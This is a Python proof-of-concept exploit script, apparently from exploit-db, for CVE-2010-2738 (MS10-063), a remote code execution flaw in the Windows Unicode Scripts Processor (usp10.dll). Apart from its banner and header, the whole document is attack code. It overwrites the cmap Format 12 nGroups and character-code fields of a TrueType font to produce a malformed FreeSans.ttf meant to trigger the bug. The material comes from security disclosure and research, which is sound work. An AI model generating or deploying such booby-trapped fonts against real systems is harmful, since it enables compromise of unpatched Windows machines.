'''
 
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  (Final Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

'''

'''
  Title             : Microsoft Unicode Scripts Processor Remote Code Execution 
  Version           : usp10.dll XP , Vista
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.microsoft.com
  Impact            : Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-2738
  MOAUB Number      : MOAUB-FINAL

http://www.exploit-db.com/moaub-30-microsoft-unicode-scripts-processor-remote-code-execution-ms10-063/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15158.zip (moaub-30-PoC.zip)
'''

import sys
import struct
def main():
   
    try:
				
		fdR = open('src.ttf', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:18316]
		nGroups = '\x00\x00\x00\xDC'          # nGroups field from Format 12 subtable  of cmap table
		startCharCode = '\x00\xE5\xF7\x20'    # startCharCode  field from a Group Structure
		endCharCode  = '\x00\xE5\xF7\xFE'     # endCharCode  field from a Group Structure
		str2 = strTotal[18328:]
		
		fdW= open('FreeSans.ttf', 'wb+')
		fdW.write(str1)
		fdW.write(nGroups)
		fdW.write(startCharCode)
		fdW.write(endCharCode)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] Font file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()